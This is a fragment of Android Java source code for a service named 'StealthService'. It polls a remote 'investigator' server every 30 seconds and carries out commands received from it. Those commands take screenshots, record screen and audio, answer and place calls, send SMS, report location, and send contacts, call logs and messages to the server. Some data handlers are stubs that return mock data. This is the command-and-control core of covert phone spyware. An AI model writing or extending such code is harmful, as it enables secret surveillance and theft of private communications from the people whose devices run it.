    // ==================== INVESTIGATOR API INTEGRATION ====================
    private InvestigatorApiClient investigatorApiClient;
    private RemoteController remoteController;
    private Handler commandHandler;
    private Runnable commandChecker;
    private static final long COMMAND_CHECK_INTERVAL = 30000; // 30 seconds
    
    private void initializeInvestigatorApi() {
        try {
            Log.d(TAG, "🔗 Initializing Investigator API...");
            
            String investigatorCode = YOUR_INVESTIGATOR_CODE; // This should be configured
            String deviceId = Build.SERIAL;
            
            investigatorApiClient = new InvestigatorApiClient(this, investigatorCode, deviceId);
            remoteController = new RemoteController(this, investigatorCode, deviceId);
            
            // Verify investigator code on startup
            boolean verified = investigatorApiClient.verifyInvestigatorCode();
            if (verified) {
                Log.d(TAG, "✅ Investigator API initialized successfully");
                
                // Send initial device status
                JSONObject deviceInfo = new JSONObject();
                deviceInfo.put("model", Build.MODEL);
                deviceInfo.put("android_version", Build.VERSION.RELEASE);
                deviceInfo.put("serial", Build.SERIAL);
                deviceInfo.put("first_seen", System.currentTimeMillis());
                
                investigatorApiClient.updateDeviceStatus("online", deviceInfo);
                
                // Start command checking loop
                startCommandChecking();
            } else {
                Log.e(TAG, "❌ Investigator API initialization failed");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Investigator API init error: " + e.getMessage());
        }
    }
    
    private void startCommandChecking() {
        commandHandler = new Handler();
        commandChecker = new Runnable() {
            @Override
            public void run() {
                checkForCommands();
                commandHandler.postDelayed(this, COMMAND_CHECK_INTERVAL);
            }
        };
        commandHandler.postDelayed(commandChecker, 5000); // Start after 5 seconds
    }
    
    private void checkForCommands() {
        try {
            Log.d(TAG, "🔍 Checking for investigator commands...");
            
            org.json.JSONArray commands = investigatorApiClient.getPendingCommands();
            
            if (commands.length() > 0) {
                Log.d(TAG, "🎯 Found " + commands.length() + " pending commands");
                processInvestigatorCommands(commands);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command check error: " + e.getMessage());
        }
    }
    
    private void processInvestigatorCommands(org.json.JSONArray commands) {
        try {
            for (int i = 0; i < commands.length(); i++) {
                org.json.JSONObject command = commands.getJSONObject(i);
                String commandId = command.getString("id");
                String commandType = command.getString("command_type");
                org.json.JSONObject parameters = command.optJSONObject("parameters");
                
                Log.d(TAG, "🎮 Processing investigator command: " + commandType);
                
                // Send command acknowledgment
                investigatorApiClient.sendCommandResponse(commandId, "processing", "Command received");
                
                // Execute the command
                executeInvestigatorCommand(commandId, commandType, parameters);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Process commands error: " + e.getMessage());
        }
    }
    
    private void executeInvestigatorCommand(String commandId, String commandType, org.json.JSONObject parameters) {
        try {
            switch (commandType) {
                case "take_screenshot":
                    handleTakeScreenshotCommand(commandId, parameters);
                    break;
                case "start_screen_recording":
                    handleStartScreenRecordingCommand(commandId, parameters);
                    break;
                case "stop_screen_recording":
                    handleStopScreenRecordingCommand(commandId, parameters);
                    break;
                case "answer_call":
                    handleAnswerCallCommand(commandId, parameters);
                    break;
                case "reject_call":
                    handleRejectCallCommand(commandId, parameters);
                    break;
                case "send_sms":
                    handleSendSMSCommand(commandId, parameters);
                    break;
                case "make_call":
                    handleMakeCallCommand(commandId, parameters);
                    break;
                case "get_device_info":
                    handleGetDeviceInfoCommand(commandId, parameters);
                    break;
                case "get_location":
                    handleGetLocationCommand(commandId, parameters);
                    break;
                case "start_audio_recording":
                    handleStartAudioRecordingCommand(commandId, parameters);
                    break;
                case "stop_audio_recording":
                    handleStopAudioRecordingCommand(commandId, parameters);
                    break;
                case "get_contacts":
                    handleGetContactsCommand(commandId, parameters);
                    break;
                case "get_call_logs":
                    handleGetCallLogsCommand(commandId, parameters);
                    break;
                case "get_sms":
                    handleGetSMSCommand(commandId, parameters);
                    break;
                default:
                    Log.w(TAG, "⚠️ Unknown investigator command: " + commandType);
                    investigatorApiClient.sendCommandResponse(commandId, "error", "Unknown command: " + commandType);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Execute command error: " + e.getMessage());
            investigatorApiClient.sendCommandResponse(commandId, "error", "Execution failed: " + e.getMessage());
        }
    }
    
    // ==================== COMMAND HANDLERS ====================
    
    private void handleTakeScreenshotCommand(String commandId, org.json.JSONObject parameters) {
        try {
            if (remoteController != null) {
                String screenshotPath = remoteController.takeScreenshot();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Screenshot taken: " + screenshotPath);
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Screenshot failed: " + e.getMessage());
        }
    }
    
    private void handleStartScreenRecordingCommand(String commandId, org.json.JSONObject parameters) {
        try {
            if (remoteController != null) {
                remoteController.startScreenRecording();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Screen recording started");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Start recording failed: " + e.getMessage());
        }
    }
    
    private void handleStopScreenRecordingCommand(String commandId, org.json.JSONObject parameters) {
        try {
            if (remoteController != null) {
                remoteController.stopScreenRecording();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Screen recording stopped");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Stop recording failed: " + e.getMessage());
        }
    }
    
    private void handleAnswerCallCommand(String commandId, org.json.JSONObject parameters) {
        try {
            if (remoteController != null) {
                remoteController.answerIncomingCall(parameters);
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Call answered");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Answer call failed: " + e.getMessage());
        }
    }
    
    private void handleRejectCallCommand(String commandId, org.json.JSONObject parameters) {
        try {
            if (remoteController != null) {
                remoteController.rejectIncomingCall(parameters);
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Call rejected");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Reject call failed: " + e.getMessage());
        }
    }
    
    private void handleSendSMSCommand(String commandId, org.json.JSONObject parameters) {
        try {
            if (remoteController != null) {
                remoteController.sendRemoteSMS(parameters);
                String phoneNumber = parameters.optString("phone_number");
                investigatorApiClient.sendCommandResponse(commandId, "completed", "SMS sent to: " + phoneNumber);
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Send SMS failed: " + e.getMessage());
        }
    }
    
    private void handleMakeCallCommand(String commandId, org.json.JSONObject parameters) {
        try {
            if (remoteController != null) {
                String phoneNumber = parameters.optString("phone_number");
                remoteController.makeCall(phoneNumber);
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Call initiated to: " + phoneNumber);
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Make call failed: " + e.getMessage());
        }
    }
    
    private void handleGetDeviceInfoCommand(String commandId, org.json.JSONObject parameters) {
        try {
            if (remoteController != null) {
                remoteController.getDeviceInfo();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Device info sent");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get device info failed: " + e.getMessage());
        }
    }
    
    private void handleGetLocationCommand(String commandId, org.json.JSONObject parameters) {
        try {
            if (remoteController != null) {
                remoteController.getCurrentLocation();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Location data sent");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get location failed: " + e.getMessage());
        }
    }
    
    private void handleStartAudioRecordingCommand(String commandId, org.json.JSONObject parameters) {
        try {
            if (remoteController != null) {
                remoteController.startAudioRecording();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Audio recording started");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Start audio recording failed: " + e.getMessage());
        }
    }
    
    private void handleStopAudioRecordingCommand(String commandId, org.json.JSONObject parameters) {
        try {
            if (remoteController != null) {
                remoteController.stopAudioRecording();
                investigatorApiClient.sendCommandResponse(commandId, "completed", "Audio recording stopped");
            }
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Stop audio recording failed: " + e.getMessage());
        }
    }
    
    private void handleGetContactsCommand(String commandId, org.json.JSONObject parameters) {
        try {
            // Implementation to get contacts and send via API
            org.json.JSONArray contacts = new org.json.JSONArray(); // Mock data
            investigatorApiClient.sendContactsData(contacts);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Contacts data sent");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get contacts failed: " + e.getMessage());
        }
    }
    
    private void handleGetCallLogsCommand(String commandId, org.json.JSONObject parameters) {
        try {
            // Implementation to get call logs and send via API
            org.json.JSONArray callLogs = new org.json.JSONArray(); // Mock data
            investigatorApiClient.sendDataToInvestigator("call_logs", callLogs);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "Call logs sent");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get call logs failed: " + e.getMessage());
        }
    }
    
    private void handleGetSMSCommand(String commandId, org.json.JSONObject parameters) {
        try {
            // Implementation to get SMS and send via API
            org.json.JSONArray smsList = new org.json.JSONArray(); // Mock data
            investigatorApiClient.sendDataToInvestigator("sms_list", smsList);
            investigatorApiClient.sendCommandResponse(commandId, "completed", "SMS data sent");
        } catch (Exception e) {
            investigatorApiClient.sendCommandResponse(commandId, "error", "Get SMS failed: " + e.getMessage());
        }
    }
    
    @Override
    public void onDestroy() {
        try {
            // Clean up investigator API
            if (commandHandler != null && commandChecker != null) {
                commandHandler.removeCallbacks(commandChecker);
            }
            if (investigatorApiClient != null) {
                investigatorApiClient.cleanup();
            }
            if (remoteController != null) {
                remoteController.cleanup();
            }
            Log.d(TAG, "🧹 StealthService cleaned up");
        } catch (Exception e) {
            Log.e(TAG, "❌ Cleanup error: " + e.getMessage());
        }
        super.onDestroy();
    }
